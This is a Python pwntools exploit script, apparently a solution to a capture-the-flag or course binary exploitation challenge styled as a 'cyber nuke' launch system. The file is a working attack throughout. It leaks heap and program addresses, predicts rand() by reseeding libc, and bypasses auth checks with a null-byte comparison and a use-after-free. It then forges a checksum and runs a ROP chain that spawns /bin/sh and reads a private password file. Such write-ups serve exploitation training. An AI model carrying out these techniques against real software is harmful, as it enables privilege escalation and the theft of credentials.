from pwn import * 
import time
from ctypes import * 
import re 
from aes import get_key_cipher

# Need to actually call these functions in order to defeat random :)
libc= "/lib/i386-linux-gnu/libc.so.6"
libc = CDLL(libc)

p = remote("127.0.0.1",31337) 

def option1(key):
    p.sendline('1') 
    p.sendline(key) 
    p.sendline('') 
    return 

def option2(key, length, pt):
    p.sendline('2') 
    p.sendline(key) 
    p.sendline(str(length)) 
    p.recvuntil('ENTER DATA TO ENCRYPT') 
    p.sendline(pt) 

# The launch code is literally just the heap value. 
# Get this from the opening screen
def heap_leak():
    # Launch the launch session in order to get the heap value
    # Add the two together to get random value
    p.recvuntil("LAUNCH SESSION") 

    # Subtract 0x8 in order to get the head of the heap memory
    session = int(p.recv()[17:27]) - 0x8
    return session 


# Set the seed of random in order to get the same random values outputted each time to predict the randomness 
def defeat_random(heap): 
    time_val = int(time.time())
    print "Current time...", time_val
    print "Heap value...", hex(heap)
    
    # Add 8 beacuse I subtracted 8 in order to use this as a general leak eariler 
    # srand takes an unsigned integer. So, we need to do the bitwise operation in order to turn this into a proper value.
    # https://stackoverflow.com/questions/20766813/how-to-convert-signed-to-unsigned-integer-in-python
    libc.srand((heap + 0x8 + time_val) & 0xffffffff )
    return 

'''
The first option asks for a launch code into data with all null bytes. 
Then, a comparision is done on this with an input buffer at the string level.
By giving this a nullbyte (\x00) it will compare null and null, which results to true! :) 
'''
def keyauth_one_defeat(): 
    option1('\x00' *1) 
    return 

'''
Uses the UAF to set a flag value in keyauth_three by using keyauth_two's encryption.
Uses the UAF to leak the key for keyauth_two by breaking random and having the key previously set in keyauth_two.
'''
def keyauth_two_and_three_defeat(): 
    # Call option 3 
    p.sendline('3') 
    p.sendline('0') 
    p.sendline('') 
    
    ''' 
    This has ALOT to it. 
    The call to option 3 (then to option 2) triggers a UAF that allocates keyauth_two OVER keyauth_three 
    This offset + 0x74-0x93 has the ciphertext to our output. 0x84 corresponds with the flag value. If we set this to 0x31337, then this will work. 
    To set this to 0x31337 we need to encrypt the data with the same IV and key. Because this is a syemmetric cipher, this will actually DECRYPT the data into offset + 0x84, bypassing the flag check :) 
    '''
    key,pt = get_key_cipher() 
    option2(key, 32,pt) 
    #option2("\x00" * 16, 32, "\x00" * 16 + "\xf8\xbb\xa3\x62\x71\x97\xd4\x53\x7f\x09\x44\x18\xe9\xb5\x23\xc3")

    # Eat the values up until twelve. The key is at offset 0x34-0x43
    for i in range(12):
        libc.rand()

    # Should have option 3 set properly from previous step!
    p.sendline('3') 

    # Iterate over the waste values that do not matter 
    p.recvuntil("CHALLENGE (64 Bytes):") 
    for i in range(4):
        p.recvline()

    # Parse the value that we care about out
    key_data = p.recvline()     
    key_data = re.sub(r'\W+', '', key_data)
    key_data = key_data[14:50]

    # Get the final key by doing some string manipulations and xoring
    crowell_key = ""
    for i in range(4):

        # Gets the current part of the string
        part = key_data[(i*8):(i+1)*8]
        
        # Reverse the string with every two chars
        part = "".join(reversed([part[i:i+2] for i in range(0, len(part), 2)]))
        # XOR with the random value to get the part of the key
        key_val = hex(int(part,16) ^ libc.rand())[2:]

        key_val = "".join(reversed([key_val[i:i+2] for i in range(0, len(key_val),     2)]))
        
        crowell_key += key_val

    crowell_key = crowell_key.upper()
    print 'Crowell Key...', crowell_key
    p.sendline('') 
    p.sendline('') 

    # Encrypt the following text with the correct plaintext
    # This should now pass the final step!
    option2(crowell_key, 32, "KING CROWELL\x00 /bin/sh\x00")
    p.sendline('') 
    p.recvuntil('PRESS ENTER TO RETURN TO MENU') 
    p.sendline('') 
    return 

def leading_zeros(num):
    hex_num = hex(num)[2:]
    while(len(hex_num) != 8):
        hex_num = "0" + hex_num 

    return hex_num
'''
Need to get the checksum equal to 0xdcdc5a9.
We can use xor properties to trivially get the needed ouput to produce the correct checksum :)
'''
def defeat_checksum(codes):
    
    case0 = 0x44 
    case1 = 0x44 + 1 
    case5 = 0x44 + 5 
    case11 = 0x44 + 11 
    case14 = 0x44 + 14 
    case15 = 0x44 + 15 

    data = create_checksum(codes)
    p.sendline(data) 
    p.sendline(data)
    return 

''' 
This function is to create the proper checksum from the programming that is done. 
'''
def create_checksum(codes): 
    # Hardcoded into the programming
    static_set_1 = swap32(0x00454e44)
    # The xored value of all the launch codes: 0xbadc0ded ^ 0xcac380cd ^ 0    xacc3d489
    # This is the checksum comparison
    end_result = 0xdcdc59a9

    data = ''
    xor_total = 0
    for code in codes: 
        xor_total = xor_total ^ code 
        # Need to do a conversion in order for the hex2byte to work properly    
        # Cannot just take the hex(code)[2:] because this will not account for leading 0's. 
        data += leading_zeros(swap32(code))

   
    # Create the xor value to have the proper checksum
    xor_total = leading_zeros(swap32(static_set_1 ^ xor_total ^ end_result))
    data += xor_total + "0" * 200
    return data 

def swap32(i):
     return struct.unpack("<I", struct.pack(">I", i))[0]

''' 
Defeats the initial checksum
Then calls for the reprogram 
'''
def pwn(heap):
    #data = hex(swap32(end_result ^ static_set_1))[2:] + "\x00" * 200
    # For code working to detonate on a target (Doom) 
    #codes = [0x4D4F4F44]
    p.sendline('4') 
     
    ''' Program for a ROP
    OPCodes: 
    Case 0 (DOOM or DISARM function call): 0x44 
    Case 1 (END): 0x45 
    Case 5 (Increment the pointer): 0x49 
    Case 11 (Print status of launch): 0x4F 
    Case 14 (Inflight reprogram): 0x52 
    Case 15 (Write to the status): 0x53 
    '''

    '''
    The first iteration is going to leak a program ptr
    The offset is 0x80. Because we add in intervals of 4, 0x80/4 = 32 decimal. 
    After we reach the offset, we print the status, the add 1 until we have leaked the whole program pointer.
    '''
    codes = []
    for i in range(32):
        codes.append(0x49494949)

    # Print, then move the pointer up for another leak
    codes.append(0x494F494F) 
    codes.append(0x494F494F) 
    # Call for a reprogram after the leak 
    codes.append(0x52525252)
    defeat_checksum(codes) 
    p.sendline('confirm') 
    
    # Leak the 4 bytes of the address
    address_lst = []
    for i in range(4):
        p.recvuntil('CYBER NUKE TARGETING STATUS: ') 
        address_lst.append(p.recvline()[9:11])
    address_lst.reverse() 
    address = '0x' + ''.join(address_lst)
    print "Leaked Program address...", address
    address = int(address,16) 
    pause() 
    '''
    After leaking the address, we are now ready to start the ROP chain. 
    We can do this by overwriting the DISARM function, that is being called from the heap. Then, calling DISARM to make the call happen. 
    But, first, we need to write the ROP chain, which is at the beginning of the nuke program ptr. 

    Chain: 
        - stack pivot (which is written further below) 
        - Move friendly values into esi and ebp. 
    '''
    codes = []
    #codes.append(heap) # esi 
    codes.append(0x11111111)
    codes.append(0x11111111) # ebx 
    codes.append(0x33333333) # ebp
    codes.append(address + 0x496c) # xor eax, eax

    ''' 
    We want to clear out both ecx and edx for syscall 0xb.
    We do this by clearing eax with 'xor eax,eax'. Then calling
    both 'xchg ecx,eax' and 'xchg edx,eax'. 
    '''
    codes.append(0x11111111) # pop edi 
    codes.append(0x11111111) # pop esi 
    codes.append(0x11111111) # pop ebx 
    codes.append(0x11111111) # pop ebp 
    codes.append(address + 0x6b46) # xchg ecx,eax gadget. Puts 0x0 into ecx

    codes.append(address + 0x496c) # xor eax, eax gadget 
    codes.append(0x11111111) # pop edi 
    codes.append(heap + 0x8) # pop esi. The gadget for putting the proper value into eax has a write from esi. So, I just put the first heap pointer here.
    codes.append(0x0000000b) # pop ebx 
    codes.append(0x11111111) # pop ebp 
    codes.append(address + 0x6cfe) # xchg edx, eax. Puts 0x0 into edx.
    
    codes.append(address + 0x4b99) # xchg ebx, eax. Puts 0xb (syscall number for execute) into eax. 
    
    codes.append(address - 0x2e90) # pop ebx gadget
    # This is put into the plaintext of keyauth_two. This location was cho    osen because the location, where this is stored, will not be altered for t    he rest of the program.
    codes.append(heap + 0x232) # Move the /bin/sh pointer into ebx. 
    codes.append(address - 0x299f) # Syscall, int 0x80. Final step in the ROP chain. 

    

    for i in range(0x80/4): 
        codes.append(0x49494949)
    
    '''
    Write to address. 
    Each option looks like this (in the byte order...) 
    none opcode - increment pointer opcode - byte to write - write opcode
       00               49                        xx            53
    0x0049xx53
    I use the none opcode just to keep the code easier to read. 
    '''
    # Jump into main... Just for the hell of it. 
    main = address + 0xead
    #0x4b98
    stack_pivot = address + 0x3f87
    print "Address of stack pivot...", hex(stack_pivot)
        
    for i in range(4):
       
        # Bit manipulations in order to get the bits from the address that we want.
        cur_byte = stack_pivot & 0xff << (i * 8)
        cur_byte = cur_byte >> (i * 8) 
        program_code = "0x0049" + hex(cur_byte)[2:] + "53" 
        codes.append(int(program_code,16))

    '''
    codes.append(0x00494153)
    codes.append(0x00494153) 
    codes.append(0x00494153)
    codes.append(0x00494153)
    '''
    defeat_checksum(codes) 
    

heap_val = heap_leak() 
defeat_random(heap_val)
keyauth_one_defeat()
keyauth_two_and_three_defeat() 
pwn(heap_val)
p.sendline('cat /home/project2_priv/.pass')

p.interactive() 

